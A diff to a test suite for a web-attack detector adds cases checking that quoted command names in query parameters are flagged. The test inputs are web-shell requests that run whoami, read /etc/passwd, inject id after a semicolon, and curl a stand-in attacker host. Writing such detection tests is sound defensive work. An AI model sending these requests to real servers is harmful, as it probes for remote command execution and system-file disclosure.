@@ -188,6 +188,13 @@ describe("webAttackSignal", () => {
     expect(fires("/shell.php?cmd=whoami")).toContain("cmd");
     expect(fires(decodeRequestTarget("/shell.php?cmd=cat+/etc/passwd").decoded)).toContain("cmd");
     expect(fires(decodeRequestTarget("/x?cmd=%20ls%20-la").decoded)).toContain("cmd"); // leading space
+    // a quoted command name runs just the same
+    expect(fires(decodeRequestTarget("/x?cmd=%27whoami%27").decoded)).toContain("cmd");
+    expect(fires(decodeRequestTarget("/x?cmd=%22cat%22%20/etc/passwd").decoded)).toContain("cmd");
+    expect(fires(decodeRequestTarget("/x?cmd=%27curl%27%20http://evil.example.invalid/x").decoded)).toContain(
+      "cmd",
+    );
+    expect(fires(decodeRequestTarget("/x?q=a;%27id%27").decoded)).toContain("cmd");
     expect(fires("/api?run=php&version=8")).toEqual([]); // a runtime selector, no execution evidence
     expect(fires("/api?command=ls&format=json")).toEqual([]); // a listing selector
     expect(fires("/resource;foo=bar;id")).toEqual([]); // keyed matrix parameters in a path
